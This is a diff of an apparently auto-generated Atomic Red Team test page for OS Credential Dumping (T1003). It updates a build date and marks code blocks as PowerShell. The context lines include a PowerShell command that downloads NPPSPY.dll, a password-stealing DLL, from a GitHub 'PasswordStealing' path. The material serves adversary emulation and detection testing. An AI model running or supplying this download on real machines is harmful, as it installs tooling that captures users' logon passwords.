@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1003"
 attack_technique_name: "OS Credential Dumping"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003/T1003.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "powershell"
 aliases:
   - "9e2173c0-ba26-4cdf-b0ed-8c54b27e3ad6"
@@ -47,13 +47,13 @@ NPPSpy.dll must be available in ExternalPayloads directory
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\NPPSPY.dll") {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
 Invoke-WebRequest -Uri https://github.com/gtworek/PSBits/raw/f221a6db08cb3b52d5f8a2a210692ea8912501bf/PasswordStealing/NPPSpy/NPPSPY.dll -OutFile "PathToAtomicsFolder\..\ExternalPayloads\NPPSPY.dll"
